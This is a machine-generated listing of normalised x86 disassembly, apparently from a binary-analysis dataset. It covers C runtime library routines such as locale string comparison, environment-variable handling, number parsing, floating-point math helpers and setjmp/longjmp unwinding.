or edx 0x80000
and ecx edi
sub ecx 0x40
je r-xdata
cmp eax 0x2000
je r-xdata
or edx 0x2000000
sub ecx 0x7fc0
je r-xdata
or edx esi
cmp eax 0x4000
je r-xdata
or edx 0x3000000
jmp r-xdata
sub ecx 0x40
jne r-xdata
or edx 0x200
jmp r-xdata
cmp eax ebx
jne r-xdata
mov eax edx
or edx 0x1000000
jmp r-xdata
or edx 0x300
jmp r-xdata
sub_455b22
mov eax [ rw-data ]
push esi
mov esi [ CloseHandle@IAT ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
cmp eax 0xfffffffe
je r-xdata
pop esi
retn
cmp eax 0xfffffffe
je r-xdata
push eax
call esi
push eax
call esi
sub_455b4f
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
jne r-xdata
dec ecx
cmp [ eax ] 0x0
je r-xdata
dec ecx
mov eax [ ebp + 0x8 ]
sub eax ecx
dec eax
pop ebp
retn
inc eax
sub_455b6d
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x14 ]
push ebx
push esi
push edi
xor edi edi
mov ebx edx
mov esi ecx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x1c ] eax
cmp [ rw-data ] edi
jne r-xdata
cmp [ ebp + 0x10 ] edi
jle r-xdata
push 0x1
mov eax r--data
push eax
push 0x1
push eax
push edi
push edi
call [ CompareStringW@IAT ]
test eax eax
je r-xdata
cmp [ ebp + 0x10 ] 0xffffffff
jge r-xdata
push [ ebp + 0x10 ]
mov eax ebx
call sub_455b4f
pop ecx
mov [ ebp + 0x10 ] eax
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
mov edx [ ebp + 0x18 ]
cmp edx edi
jle r-xdata
xor eax eax
jmp r-xdata
cmp edx 0xffffffff
jl r-xdata
mov eax [ ebp - 0x1c ]
push edx
call sub_455b4f
mov edx eax
pop ecx
mov [ ebp + 0x18 ] edx
jmp r-xdata
mov [ rw-data ] 0x2
lea esp [ ebp - 0x38 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_43f96b
leave
retn
mov ecx [ rw-data ]
cmp ecx 0x2
je r-xdata
xor edi edi
xor ebx ebx
cmp [ ebp + 0x8 ] edi
jne r-xdata
cmp ecx edi
je r-xdata
cmp [ ebp + 0x1c ] edi
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x14 ]
mov [ ebp + 0x8 ] eax
xor eax eax
inc eax
cmp ecx eax
jne r-xdata
push [ ebp + 0x8 ]
call sub_453e71
mov esi eax
pop ecx
cmp esi 0xffffffff
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x1c ] eax
mov [ ebp - 0x28 ] edi
cmp [ ebp + 0x1c ] edi
jne r-xdata
cmp esi [ ebp + 0x1c ]
je r-xdata
cmp [ ebp + 0x10 ] edi
je r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
mov [ ebp + 0x1c ] ecx
push [ ebp + 0x18 ]
push [ ebp - 0x1c ]
push [ ebp + 0x10 ]
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CompareStringA@IAT ]
mov esi eax
test ebx ebx
je r-xdata
push 0x0
push 0x0
lea eax [ ebp + 0x10 ]
push eax
push [ ebp - 0x24 ]
push esi
push [ ebp + 0x1c ]
call sub_453eba
mov ebx eax
add esp 0x18
test ebx ebx
je r-xdata
cmp [ ebp + 0x10 ] edx
jne r-xdata
cmp edx edi
jne r-xdata
mov eax esi
push ebx
call sub_44120e
push edi
call sub_44120e
pop ecx
pop ecx
push 0x0
push 0x0
lea eax [ ebp + 0x18 ]
push eax
push [ ebp - 0x1c ]
push esi
push [ ebp + 0x1c ]
call sub_453eba
mov edi eax
add esp 0x18
test edi edi
jne r-xdata
cmp edx eax
jg r-xdata
push 0x2
mov esi [ MultiByteToWideChar@IAT ]
push edi
push edi
push [ ebp + 0x10 ]
push ebx
push 0x9
push [ ebp + 0x1c ]
call esi
mov ebx eax
mov [ ebp - 0x2c ] ebx
cmp ebx edi
je r-xdata
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x1c ] edi
push ebx
call sub_44120e
pop ecx
jmp r-xdata
cmp [ ebp + 0x10 ] eax
jle r-xdata
mov edi 0x400
test ebx ebx
jle r-xdata
lea eax [ ebp - 0x18 ]
push eax
push [ ebp + 0x1c ]
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
push 0x3
jmp r-xdata
and [ ebp - 0x20 ] 0x0
push 0xffffffe0
xor edx edx
pop eax
div ebx
cmp eax 0x2
jb r-xdata
cmp [ ebp + 0x10 ] edi
jle r-xdata
pop eax
jmp r-xdata
push ebx
push [ ebp - 0x20 ]
push [ ebp + 0x10 ]
push [ ebp - 0x24 ]
push 0x1
push [ ebp + 0x1c ]
call esi
test eax eax
je r-xdata
lea eax [ ebx + ebx + 0x8 ]
cmp eax edi
ja r-xdata
cmp [ ebp + 0x18 ] edi
jle r-xdata
cmp [ ebp - 0x18 ] 0x2
jb r-xdata
push [ ebp - 0x20 ]
call sub_413960
mov eax [ ebp - 0x28 ]
pop ecx
jmp r-xdata
push 0x0
push 0x0
push [ ebp + 0x18 ]
push [ ebp - 0x1c ]
push 0x9
push [ ebp + 0x1c ]
call esi
mov ebx eax
test ebx ebx
je r-xdata
push eax
call sub_441c3d
pop ecx
test eax eax
je r-xdata
call sub_443650
mov eax esp
test eax eax
je r-xdata
cmp [ ebp - 0x18 ] 0x2
jae r-xdata
cmp [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x12 ]
je r-xdata
jle r-xdata
mov [ ebp - 0x20 ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
cmp [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x12 ]
je r-xdata
xor eax eax
inc eax
jmp r-xdata
mov dl [ eax + 0x1 ]
test dl dl
je r-xdata
xor edi edi
push 0xffffffe0
xor edx edx
pop eax
div ebx
cmp eax 0x2
jb r-xdata
cmp [ ebp - 0x20 ] 0x0
je r-xdata
add eax 0x8
mov dl [ eax + 0x1 ]
test dl dl
je r-xdata
mov cl [ ebx ]
cmp cl [ eax ]
jb r-xdata
push ebx
push edi
push [ ebp + 0x18 ]
push [ ebp - 0x1c ]
push 0x1
push [ ebp + 0x1c ]
call esi
test eax eax
je r-xdata
lea eax [ ebx + ebx + 0x8 ]
cmp eax edi
ja r-xdata
mov ecx [ ebp - 0x1c ]
mov cl [ ecx ]
cmp cl [ eax ]
jb r-xdata
inc eax
inc eax
cmp [ eax ] 0x0
jne r-xdata
cmp cl dl
jbe r-xdata
push edi
call sub_413960
pop ecx
push ebx
push edi
push [ ebp - 0x2c ]
push [ ebp - 0x20 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CompareStringW@IAT ]
mov [ ebp - 0x28 ] eax
push eax
call sub_441c3d
pop ecx
test eax eax
je r-xdata
call sub_443650
mov edi esp
test edi edi
je r-xdata
inc eax
inc eax
cmp [ eax ] 0x0
jne r-xdata
cmp cl dl
jbe r-xdata
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ edi ] 0xcccc
add edi 0x8
jmp r-xdata
jmp r-xdata
test edi edi
je r-xdata
sub_455edd
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_441455
push [ ebp + 0x24 ]
mov edx [ ebp + 0x14 ]
push [ ebp + 0x20 ]
lea ecx [ ebp - 0x10 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_455b6d
add esp 0x18
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_455f1f
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_441455
mov edx [ ebp + 0x10 ]
xor ebx ebx
cmp edx ebx
jne r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
call sub_443b37
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_440791
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push esi
mov esi 0x7fffffff
cmp edx esi
jbe r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x10 ]
cmp ecx ebx
jne r-xdata
call sub_443b37
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_440791
add esp 0x14
jmp r-xdata
push [ eax + 0x8 ]
lea eax [ ebp - 0x10 ]
push edx
push [ ebp + 0xc ]
push edx
push [ ebp + 0x8 ]
push 0x1001
push ecx
push eax
call sub_455edd
add esp 0x20
cmp eax ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_454cb0
add esp 0x10
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
add eax 0xfffffffe
call sub_443b37
mov [ eax ] 0x16
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop esi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_456019
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ rw-data ]
jmp r-xdata
mov eax [ esi ]
test eax eax
jne r-xdata
push edi
push eax
push [ ebp + 0x8 ]
call sub_454bff
add esp 0xc
test eax eax
jne r-xdata
mov eax esi
sub eax [ rw-data ]
sar eax 0x2
neg eax
add esi 0x4
mov eax [ esi ]
mov al [ edi + eax ]
cmp al 0x3d
je r-xdata
mov eax esi
sub eax [ rw-data ]
sar eax 0x2
jmp r-xdata
test al al
je r-xdata
pop esi
pop ebp
retn
sub_45606b
mov edi edi
push ebp
mov ebp esp
push ecx
push edi
mov edi eax
xor eax eax
mov ecx edi
test edi edi
je r-xdata
pop edi
leave
retn
cmp [ edi ] eax
je r-xdata
push esi
inc eax
push 0x4
push eax
call sub_445f7b
mov esi eax
pop ecx
pop ecx
mov [ ebp - 0x4 ] esi
test esi esi
jne r-xdata
add ecx 0x4
inc eax
cmp [ ecx ] 0x0
jne r-xdata
mov eax [ edi ]
test eax eax
jne r-xdata
push 0x9
call sub_445acd
jmp r-xdata
push eax
call sub_456371
mov [ esi ] eax
add esi 0x4
add edi 0x4
and [ esi ] eax
mov eax [ ebp - 0x4 ]
pop esi
pop ecx
sub_4560c5
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
mov [ ebp - 0xc ] ebx
cmp eax ebx
jne r-xdata
push esi
mov esi [ eax ]
push edi
mov [ ebp - 0x4 ] esi
cmp esi ebx
je r-xdata
call sub_443b37
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_440791
add esp 0x14
or eax 0xffffffff
jmp r-xdata
call sub_443b37
mov [ eax ] 0x16
push 0x3d
push esi
call sub_456482
mov edi eax
pop ecx
pop ecx
mov [ ebp - 0x14 ] edi
cmp edi ebx
je r-xdata
pop ebx
leave
retn
cmp esi edi
je r-xdata
xor eax eax
cmp [ edi + 0x1 ] bl
sete al
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
cmp eax [ rw-data ]
jne r-xdata
cmp eax ebx
jne r-xdata
call sub_45606b
mov [ rw-data ] eax
mov esi [ rw-data ]
mov [ ebp - 0x10 ] esi
cmp esi ebx
je r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
or eax 0xffffffff
sub edi [ ebp - 0x4 ]
push [ ebp - 0x4 ]
call sub_456019
mov edi eax
cmp edi ebx
pop ecx
jl r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
cmp [ rw-data ] ebx
je r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
cmp [ esi ] ebx
je r-xdata
xor eax eax
jmp r-xdata
push 0x4
call sub_445f36
pop ecx
mov [ rw-data ] eax
cmp eax ebx
je r-xdata
call sub_454c19
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call sub_44120e
mov eax [ ebp + 0x8 ]
pop ecx
mov [ eax ] ebx
cmp edi ebx
jge r-xdata
lea esi [ esi + edi * 4 ]
push [ esi ]
call sub_44120e
pop ecx
cmp [ ebp - 0x8 ] ebx
jne r-xdata
pop edi
pop esi
mov [ eax ] ebx
cmp [ rw-data ] ebx
jne r-xdata
lea eax [ edi + 0x2 ]
cmp eax edi
jl r-xdata
neg edi
cmp [ esi ] ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
jmp r-xdata
push 0x4
call sub_445f36
pop ecx
mov [ rw-data ] eax
cmp eax ebx
je r-xdata
cmp eax 0x3fffffff
jae r-xdata
mov eax [ esi + 0x4 ]
mov [ esi ] eax
mov eax [ ebp - 0x10 ]
inc edi
lea esi [ eax + edi * 4 ]
cmp edi 0x3fffffff
jae r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
mov [ eax ] ebx
push eax
push 0x4
push [ rw-data ]
call sub_446016
add esp 0xc
cmp eax ebx
je r-xdata
push 0x4
push edi
push [ rw-data ]
call sub_446016
add esp 0xc
cmp eax ebx
je r-xdata
cmp [ ebp - 0x8 ] ebx
je r-xdata
mov esi [ ebp - 0x4 ]
push 0x1
push esi
call sub_442e20
inc eax
pop ecx
inc eax
push eax
call sub_445f7b
mov edi eax
pop ecx
pop ecx
cmp edi ebx
je r-xdata
mov edx [ ebp - 0x4 ]
lea ecx [ eax + edi * 4 ]
mov [ ecx ] edx
mov [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
mov [ ecx ] ebx
jmp r-xdata
mov eax [ ebp - 0xc ]
jmp r-xdata
push [ ebp - 0x4 ]
call sub_44120e
mov eax [ ebp + 0x8 ]
pop ecx
mov [ eax ] ebx
push esi
push esi
call sub_442e20
inc eax
pop ecx
inc eax
push eax
push edi
call sub_443bb7
add esp 0xc
test eax eax
je r-xdata
mov [ rw-data ] eax
mov ecx [ ebp - 0x8 ]
mov eax edi
sub eax esi
add eax [ ebp - 0x14 ]
mov [ eax ] bl
inc eax
neg ecx
sbb ecx ecx
not ecx
and ecx eax
push ecx
push edi
call [ SetEnvironmentVariableA@IAT ]
test eax eax
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_440669
add esp 0x14
push edi
call sub_44120e
pop ecx
or [ ebp - 0xc ] 0xffffffff
call sub_443b37
mov [ eax ] 0x2a
sub_456310
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
mov ecx 0xffffffff
jb r-xdata
add esi 0x1
add edi 0x1
cmp ah bh
jb r-xdata
neg ecx
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
sub ecx 0x1
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_456371
mov edi edi
push ebp
mov ebp esp
push ebx
xor ebx ebx
cmp [ ebp + 0x8 ] ebx
jne r-xdata
push esi
push edi
push [ ebp + 0x8 ]
call sub_442e20
mov esi eax
inc esi
push esi
call sub_441c3d
mov edi eax
pop ecx
pop ecx
cmp edi ebx
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
push [ ebp + 0x8 ]
push esi
push edi
call sub_443bb7
add esp 0xc
test eax eax
je r-xdata
pop ebx
pop ebp
retn
mov eax edi
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_440669
add esp 0x14
pop edi
pop esi
sub_4563c6
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x10 ]
call sub_441455
mov eax [ ebp + 0x8 ]
xor ebx ebx
cmp eax ebx
jne r-xdata
push esi
mov esi [ ebp - 0xc ]
cmp [ esi + 0x8 ] ebx
jne r-xdata
call sub_443b37
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_440791
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
movzx cx [ eax ]
movzx ecx cx
cmp cx bx
jne r-xdata
push [ ebp + 0xc ]
push eax
call sub_441150
pop ecx
pop ecx
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
movzx edx cl
test [ edx + esi + 0x1d ] 0x4
je r-xdata
movzx ecx cx
cmp [ ebp + 0xc ] ecx
jne r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
pop ebx
leave
retn
movzx edx cx
cmp [ ebp + 0xc ] edx
je r-xdata
inc eax
mov dl [ eax ]
cmp dl bl
je r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
pop esi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
inc eax
movzx ecx cx
movzx edx dl
shl ecx 0x8
or ecx edx
cmp [ ebp + 0xc ] ecx
jne r-xdata
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
dec eax
jmp r-xdata
sub_4564b2
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
xor ebx ebx
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov ecx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
cmp ecx ebx
je r-xdata
call sub_443b37
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_440791
add esp 0x14
or eax 0xffffffff
jmp r-xdata
mov eax 0x7fffffff
mov [ ebp - 0x1c ] eax
cmp ecx eax
ja r-xdata
cmp esi ebx
jne r-xdata
pop ebx
leave
retn
push edi
lea eax [ ebp + 0x14 ]
push eax
push ebx
push [ ebp + 0x10 ]
lea eax [ ebp - 0x20 ]
push eax
mov [ ebp - 0x14 ] 0x42
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x20 ] esi
call sub_44b4ca
add esp 0x10
mov edi eax
cmp esi ebx
je r-xdata
mov [ ebp - 0x1c ] ecx
call sub_443b37
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_440791
add esp 0x14
or eax 0xffffffff
jmp r-xdata
pop edi
dec [ ebp - 0x1c ]
js r-xdata
pop esi
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_446068
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
mov eax edi
sub_456561
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x18 ]
mov esi ebx
call sub_441455
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
test ebx ebx
jne r-xdata
mov [ edi ] ebx
mov eax [ ebp - 0x18 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
call sub_443b37
mov [ eax ] 0x16
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_440791
add esp 0x14
cmp [ ebp - 0xc ] bl
je r-xdata
movzx ecx [ esi ]
mov eax [ eax + 0xc8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8
lea eax [ ebp - 0x18 ]
push eax
movzx eax [ esi ]
push 0x8
push eax
call sub_44cda9
add esp 0xc
jmp r-xdata
fldz
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ ebp - 0x18 ]
push eax
push 0x0
push 0x0
push esi
call sub_442e20
pop ecx
push eax
lea eax [ ebp - 0x30 ]
push esi
push eax
call sub_44cd02
add esp 0x18
mov ecx eax
test edi edi
je r-xdata
inc esi
jmp r-xdata
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ecx ]
test eax 0x240
je r-xdata
mov eax [ ecx + 0x4 ]
add eax esi
mov [ edi ] eax
test al 0x81
je r-xdata
fldz
fstp [ ebp - 0x8 ]
test edi edi
je r-xdata
test eax 0x100
je r-xdata
cmp [ esi ] 0x2d
fld [ rw-data ]
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov [ edi ] ebx
jmp r-xdata
fld [ ecx + 0x10 ]
fstp [ ebp - 0x8 ]
fldz
fcom [ ecx + 0x10 ]
fnstsw ax
test ah 0x44
jpe r-xdata
fstp [ ebp - 0x8 ]
call sub_443b37
mov [ eax ] 0x22
jmp r-xdata
fchs
jmp r-xdata
fld [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
fstp st0
sub_456698
push ebp
mov ebp esp
sub esp 0x50
mov ebx [ esp + 0x58 ]
mov [ ebp - 0x50 ] 0x80000026
mov [ ebp - 0x4c ] 0x0
mov [ ebp - 0x48 ] 0x0
mov [ ebp - 0x44 ] 0x0
mov [ ebp - 0x40 ] 0x0
lea eax [ ebp - 0x50 ]
mov ebp [ ebx ]
mov esi [ ebx + 0x18 ]
cmp esi [ fs : 0x0 ]
je r-xdata
cmp esi 0x0
je r-xdata
push ebx
push esi
push 0x0
push eax
push r-xdata
push esi
call RtlUnwind
pop esi
pop ebx
push 0x0
mov eax [ ebx + 0x14 ]
call sub_450281
mov edx ebx
mov ebx [ edx + 0x4 ]
mov edi [ edx + 0x8 ]
mov esi [ edx + 0xc ]
mov eax [ esp + 0x5c ]
cmp eax 0x1
adc eax 0x0
mov esp [ edx + 0x10 ]
add esp 0x4
jmp [ edx + 0x14 ]
lea eax [ ebx + 0x20 ]
push eax
call sub_456750
or eax eax
je r-xdata
mov eax [ ebx + 0x1c ]
push eax
push esi
call sub_4501d1
add esp 0x8
mov eax [ ebx + 0x20 ]
cmp eax 0x56433230
jne r-xdata
mov eax [ ebx + 0x24 ]
or eax eax
je r-xdata
push ebx
call eax
jmp r-xdata
sub_4567bc
cmp [ rw-data ] 0x0
je sub_4567d6
sub esp 0x4
fnstcw [ esp ]
pop eax
and ax 0x7f
cmp ax 0x7f
je r-xdata
push ebp
mov ebp esp
sub esp 0x8
and esp 0xfffffff8
fstp [ esp ]
cvttsd2si eax [ esp ]
leave
retn
sub_4567d6
push ebp
mov ebp esp
sub esp 0x20
and esp 0xfffffff0
fld st0
fst [ esp + 0x18 ]
fistp [ esp + 0x10 ]
fild [ esp + 0x10 ]
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
mov edx [ esp + 0x14 ]
test edx 0x7fffffff
jne r-xdata
fsubp st1
test edx edx
jns r-xdata
fstp [ esp + 0x18 ]
fstp [ esp + 0x18 ]
fstp [ esp ]
mov ecx [ esp ]
add ecx 0x7fffffff
sbb eax 0x0
mov edx [ esp + 0x14 ]
sbb edx 0x0
jmp r-xdata
fstp [ esp ]
mov ecx [ esp ]
xor ecx 0x80000000
add ecx 0x7fffffff
adc eax 0x0
mov edx [ esp + 0x14 ]
adc edx 0x0
jmp r-xdata
leave
retn
sub_456850
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ esp + 0xc ]
call sub_457b45
sub esp 0x8
stmxcsr [ esp + 0x4 ]
mov eax [ esp + 0x4 ]
and eax 0x1f80
cmp eax 0x1f80
jne r-xdata
lea esp [ esp + 0x8 ]
jne r-xdata
fnstcw [ esp ]
mov ax [ esp ]
and ax 0x7f
cmp ax 0x7f
jmp sub_456b79
sub_456890
cmp [ rw-data ] 0x0
je r-xdata
sub esp 0x14
fxch st1
fstp [ esp ]
fst [ esp + 0x8 ]
mov eax [ esp + 0xc ]
call sub_4568ed
add esp 0x14
retn
sub esp 0x8
stmxcsr [ esp + 0x4 ]
mov eax [ esp + 0x4 ]
and eax 0x1f80
cmp eax 0x1f80
jne r-xdata
lea esp [ esp + 0x8 ]
jne r-xdata
fnstcw [ esp ]
mov ax [ esp ]
and ax 0x7f
cmp ax 0x7f
jmp sub_456b60
sub_4568ed
mov ecx eax
push eax
fwait
fnstcw [ esp ]
cmp [ esp ] 0x27f
je r-xdata
and ecx 0x7ff00000
lea edx [ esp + 0x8 ]
cmp ecx 0x7ff00000
je r-xdata
call sub_457b15
xor ecx ecx
and eax 0xfffff
or eax [ esp + 0x10 ]
jne r-xdata
call sub_457b45
je r-xdata
lea edx [ esp + 0x8 ]
call sub_457b45
test [ esp + 0x16 ] 0x8
jne r-xdata
lea edx [ esp + 0x8 ]
call sub_457b45
xor ecx ecx
jmp r-xdata
test eax 0x7ff00000
je r-xdata
faddp st1
mov eax 0x1
jmp r-xdata
inc ecx
jmp r-xdata
test ecx ecx
jne r-xdata
or edx [ esp + 0x8 ]
jne r-xdata
mov eax [ esp + 0xc ]
mov edx eax
and eax 0x7ff00000
and edx 0xfffff
cmp eax 0x7ff00000
jne r-xdata
mov eax [ esp + 0xc ]
and eax 0xfffff
or eax [ esp + 0x8 ]
jne r-xdata
mov cl [ esp + 0xf ]
and cl 0x80
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
faddp st1
mov eax 0x7
jmp r-xdata
sub esp 0x74
mov ecx esp
push ecx
sub esp 0x10
fstp [ esp ]
fstp [ esp + 0x8 ]
fwait
fnsave [ ecx + 0x8 ]
call sub_457cf2
add esp 0x10
pop ecx
frstor [ ecx + 0x8 ]
fld [ ecx ]
add esp 0x74
test eax eax
je r-xdata
test [ esp + 0xe ] 0x8
jne r-xdata
fstp st0
mov eax [ esp + 0x14 ]
and eax 0x7fffffff
or eax [ esp + 0x10 ]
je r-xdata
fld st1
call sub_456ab2
fchs
test cl cl
jne r-xdata
fyl2x
call sub_457b00
cmp cl 0x1
jne r-xdata
cmp [ esp ] 0x27f
je r-xdata
lea ecx [ rw-data ]
mov edx 0x1d
call sub_457aa0
pop edx
retn
mov eax 0x1
jmp r-xdata
fstp st0
fld1
jmp r-xdata
call sub_456ab2
mov ch [ esp + 0xf ]
shr ch 0x7
test [ esp + 0x17 ] 0x80
je r-xdata
fstp st0
fstp st0
fld [ rw-data ]
mov eax 0x1
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
fchs
pop edx
retn
fldcw [ esp ]
fldz
test ch cl
je r-xdata
fld [ rw-data ]
test ch cl
je r-xdata
lea ecx [ rw-data ]
mov edx 0x1d
jmp r-xdata
fchs
jmp r-xdata
mov eax 0x2
jmp r-xdata
fchs
sub esp 0x8
fst [ esp ]
mov eax [ esp + 0x4 ]
add esp 0x8
and eax 0x7ff00000
je r-xdata
fld [ r--data ]
fxch st1
fscale
fstp st1
fld st0
fabs
fcomp [ r--data ]
fwait
fnstsw ax
sahf
mov eax 0x4
jae r-xdata
cmp eax 0x7ff00000
je r-xdata
cmp edx 0x1d
je r-xdata
fmul [ r--data ]
jmp r-xdata
fld [ r--data ]
fxch st1
fscale
fstp st1
fld st0
fabs
fcomp [ r--data ]
fwait
fnstsw ax
sahf
mov eax 0x3
jbe r-xdata
mov ax [ esp ]
cmp ax 0x27f
je r-xdata
call sub_457aa0
pop edx
retn
call sub_457ab7
pop edx
retn
fmul [ r--data ]
jmp r-xdata
pop edx
retn
and ax 0x20
jne r-xdata
fldcw [ esp ]
fwait
fnstsw ax
and ax 0x20
je r-xdata
mov eax 0x8
sub_456ab2
fld st0
frndint
fcomp st1
mov cl 0x0
fwait
fnstsw ax
sahf
jne r-xdata
fstp st0
retn
fmul [ rw-data ]
inc cl
fld st0
frndint
fcompp
fwait
fnstsw ax
sahf
jne r-xdata
retn
inc cl
sub_456adc
mov edx [ esp + 0x4 ]
mov [ edx ] ebp
mov [ edx + 0x4 ] ebx
mov [ edx + 0x8 ] edi
mov [ edx + 0xc ] esi
mov [ edx + 0x10 ] esp
mov eax [ esp ]
mov [ edx + 0x14 ] eax
mov [ edx + 0x20 ] 0x56433230
mov [ edx + 0x24 ] 0x0
mov eax [ fs : 0x0 ]
mov [ edx + 0x18 ] eax
cmp eax 0xffffffff
jne r-xdata
mov ecx [ esp + 0x8 ]
or ecx ecx
je r-xdata
mov [ edx + 0x1c ] 0xffffffff
jmp r-xdata
mov eax [ eax + 0xc ]
mov [ edx + 0x1c ] eax
jmp r-xdata
mov eax [ esp + 0xc ]
mov [ edx + 0x24 ] eax
dec ecx
jne r-xdata
sub eax eax
retn
mov eax [ esp + 0x10 ]
mov [ edx + 0x1c ] eax
dec ecx
je r-xdata
push esi
push edi
lea esi [ esp + 0x1c ]
lea edi [ edx + 0x28 ]
cmp ecx 0x6
jbe r-xdata
[ edi ] [ esi ]
pop edi
pop esi
mov ecx 0x6
